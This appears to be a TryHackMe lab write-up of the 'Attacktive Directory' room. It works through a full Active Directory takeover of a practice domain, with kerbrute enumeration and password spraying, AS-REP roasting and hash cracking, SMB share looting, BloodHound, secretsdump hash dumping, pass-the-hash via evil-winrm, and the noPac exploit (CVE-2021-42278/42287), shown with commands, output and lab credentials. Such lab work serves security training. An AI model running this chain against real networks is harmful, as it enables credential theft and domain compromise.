---
title: Attacktive Directory
categories: [TryHackMe, Active Directory]
date: 2022-01-09
tags: [ad/kerbrute/user-enum, ad/as-rep-roasting, ad/kerbrute/password-spray, ad/kerberoasting, tcp/139-445-smb/fileshare , ad/bloodhound, ad/evil-winrm, ad/secretsdump]
img_path: /Writeups/Vulnhub/Linux/Attacktive Directory/images/
image:
  src: Pasted%20image%2020220219220550.png
  width: 1000   # in pixels
  height: 400   # in pixels
---

# Recon 

## TCP/139,445 (SMB)

### Crackmapexec
1. crackmapexec
	```
	crackmapexec smb $ip
	```
	![Attacktivedirect crackmapexec.png](Attacktivedirect%20crackmapexec.png)
2. Enum4linux
	![Attacktivedirect enum4linux.png](Attacktivedirect%20enum4linux.png)
	- Unable to enumerate any users.
	- Domain Name AKA DNS Domain: `spookysec.local`
	- FQDN: `AttacktiveDirectory.spookysec.local`

## TCP/88 (Kerberos)
### Kerbrute - Username Enumeration
1. Enumerate usernames 
	```
	~/tools/windows-binaries/AD/kerbrute userenum --dc $ip -d spookysec.local userlist.txt -o found_users.txt
	```
	![Pasted image 20220219214539.png](Pasted%20image%2020220219214539.png)
2. Grep usernames, remove repeated words
	```
	cat found_users.txt | cut -d ':' -f4 | cut -d '@' -f1 | cut -d ' ' -f2 | sort -u |uniq --ignore-case > found_users_grep.txt
	```

###  GetNPUsers.py - AS-REP Roasting
- Obtain hash
	```
	GetNPUsers.py spookysec.local/ -usersfile found_users_grep.txt -dc-ip=$ip
	```
	![Attacktivedirect AS-REP Roasting.png](Attacktivedirect%20AS-REP%20Roasting.png)
	- Out of all the users, only `svc-admin` has `pre-auth` disabled
- Crack hash
	```
	hashcat -m 18200 AS-REP_hash.txt passwordlist.txt
	```
	![Attacktivedirect cracking AS-REP_HASH.png](Attacktivedirect%20cracking%20AS-REP_HASH.png)
	- svc-admin:management2005

### Kerbrute - Password Spraying 
- Password Spray
	```
	~/tools/windows-binaries/AD/kerbrute passwordspray --dc $ip -d spookysec.local found_users_grep.txt management2005 -o password_spray_results.txt
	```
	![Attacktivedirect password spray.png](Attacktivedirect%20password%20spray.png)
	- Password not reused elsewhere

### GetUserSPNs - Kerberoasting 
1. Obtain kerberoast hash
	```
	GetUserSPNs.py spookysec.local/svc-admin:management2005 -dc-ip $ip -request
	```
	- Unable to find any SPN service to crack

# Initial Foothold
1. Could not RDP/Evil-WINRM using `svc-admin`
2. Access `svc-admin` fileshares
	```
	smbmap -u 'svc-admin' -p 'management2005' -H $ip 
	```
	![Attactivedirect smbmap.png](Attactivedirect%20smbmap.png)
3. View `backup` directory
	```
	smbclient //$ip/backup -U 'svc-admin'
	```
	![Pasted image 20220219214804.png](Pasted%20image%2020220219214804.png)
4.  Get all files recursively from `backup` directory
	```
	smbclient //$ip/backup -U 'svc-admin' -c 'prompt;recurse;mget *'
	```
	![Attacktivedirect backup user creds.png](Attacktivedirect%20backup%20user%20creds.png)
	- backup@spookysec.local:backup2517860

# Privilege Escalation 

## Domain Admin - Secretsdump
1. Look for privilege escalation path w/ bloodhound
	```
	/usr/bin/neo4j start
	bloodhound-python -u backup -p backup2517860 -ns $ip -d spookysec.local -c All --zip
	```
	```
	# More complete syntax
	bloodhound-python -c All -u 'svc-admin' -p 'management2005' -gc 'ATTACKTIVEDIREC.spookysec.local' -dc 'AttacktiveDirectory.spookysec.local' -d 'spookysec.local' -ns $ip --zip
	```
	![](Pasted%20image%2020220219213410.png)
	- Both command works, use 1 only
2. Bloodhound Analysis
	- Setup
	![](Pasted%20image%2020220219202830.png)
	- Results:
		![](Pasted%20image%2020220219203013.png)
	![](Pasted%20image%2020220219203505.png)
3. User backup@spookysec.local has generic all over the domain controller, allowing us to dump hashes on domain w/ secretsdump
	```
	┌──(root💀kali)-[~/tryhackme/attacktivedirect/10.10.184.179/exploit/bloodhound]
	└─# impacket-secretsdump 'spookysec.local/backup@10.10.58.30' -just-dc -outputfile secrets_dump_hash.txt
	```
	![](Pasted%20image%2020220219213654.png)
4. Extract only NTLM hash
	```
	cat secrets_dump_hash.txt.ntds | cut -d ':' -f4
	```
5. Check if we can access SMB/WinRM w/ a-spooks:0e0363213e37b94221497260b0bcb4fc
	```
	crackmapexec smb/winrm $ip -u 'a-spooks' -H '0e0363213e37b94221497260b0bcb4fc'
	```
	![](Pasted%20image%2020220219213031.png)
6. Access via evil-winrm to obtain flags
	```
	evil-winrm -u 'a-spooks' -H '0e0363213e37b94221497260b0bcb4fc' -i $ip
	```
	![](Pasted%20image%2020220219212526.png)
	![](Pasted%20image%2020220219213758.png)
	
## Domain Admin - CVE-2021-42278 & CVE-2021-42287
1. This exploit allows us to privilege escalate from any domain user to a domain administrator
2. Download exploit
	``` 
	git clone https://github.com/Alh4zr3d/sam-the-admin.git
	```
3. Download scanner
	``` 
	git clone https://github.com/Ridter/noPac.git
	```
4. Run scanner
	``` 
	┌──(root💀kali)-[~/tools/noPac]
	└─# python3 scanner.py spookysec.local/svc-admin:'management2005' -dc-ip $ip -use-ldap

	███    ██  ██████  ██████   █████   ██████ 
	████   ██ ██    ██ ██   ██ ██   ██ ██      
	██ ██  ██ ██    ██ ██████  ███████ ██      
	██  ██ ██ ██    ██ ██      ██   ██ ██      
	██   ████  ██████  ██      ██   ██  ██████ 



	[*] Current ms-DS-MachineAccountQuota = 10
	[*] Got TGT with PAC from 10.10.58.30. Ticket size 1530
	[*] Got TGT from AttacktiveDirectory.spookysec.local. Ticket size 733
	```
5. Run the exploit
	``` 
	┌──(root💀kali)-[~/tryhackme/attacktivedirect/10.10.184.179/exploit/sam-the-admin]
	└─# python3 sam_the_admin.py -dc-ip $ip spookysec.local/svc-admin:management2005
	Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

	[-] WARNING: Target host is not a DC
	[*] Selected Target attacktivedirectory.spookysec.local
	[*] Total Domain Admins 2
	[*] will try to impersonate Administrator
	[*] Current ms-DS-MachineAccountQuota = 10
	[*] Adding Computer Account "CTHULHU-FHTAGN-38$"
	[*] MachineAccount "CTHULHU-FHTAGN-38$" password = dRP0p0Q3gnM#
	[*] Successfully added machine account CTHULHU-FHTAGN-38$ with password dRP0p0Q3gnM#.
	[*] CTHULHU-FHTAGN-38$ object = CN=CTHULHU-FHTAGN-38,CN=Computers,DC=spookysec,DC=local
	[*] CTHULHU-FHTAGN-38$ sAMAccountName == attacktivedirec
	[*] Saving ticket in attacktivedirec.ccache
	[*] Resting the machine account to CTHULHU-FHTAGN-38$
	[*] Restored CTHULHU-FHTAGN-38$ sAMAccountName to original value
	[*] Using TGT from cache
	[*] Impersonating Administrator
	[*] 	Requesting S4U2self
	[*] Saving ticket in Administrator.ccache
	[*] You can deploy a shell when you want using the following command:
	[$] KRB5CCNAME='Administrator.ccache' /usr/bin/impacket-smbexec -target-ip 10.10.58.30 -dc-ip 10.10.58.30 -k -no-pass @'attacktivedirectory.spookysec.local'
	[*] Deleting Computer Account "CTHULHU-FHTAGN-38$"
	[*] MachineAccount "CTHULHU-FHTAGN-38$" password = dRP0p0Q3gnM#
	Kerberos auth requires DNS name of the target DC. Use -dc-host.
	```
6. Obtain a shell w/ smbexec
	``` 
	┌──(root💀kali)-[~/tryhackme/attacktivedirect/10.10.184.179/exploit/sam-the-admin]
	└─# KRB5CCNAME='Administrator.ccache' /usr/bin/impacket-smbexec -target-ip $ip -dc-ip $ip -k -no-pass @AttacktiveDirectory.spookysec.local
	```
	![](Pasted%20image%2020220219205600.png)
7. Or dump hashes w/ secretsdump
	``` 
	┌──(root💀kali)-[~/tryhackme/attacktivedirect/10.10.184.179/exploit/sam-the-admin]
	└─# KRB5CCNAME='Administrator.ccache' /usr/bin/impacket-secretsdump -target-ip $ip -dc-ip $ip -k -no-pass @AttacktiveDirectory.spookysec.local
	```
	![](Pasted%20image%2020220219215222.png)
8. Explanation of exploit
	- https://www.fortinet.com/blog/threat-research/cve-2021-42278-cve-2021-42287-from-user-to-domain-admin-60-seconds
	- https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html
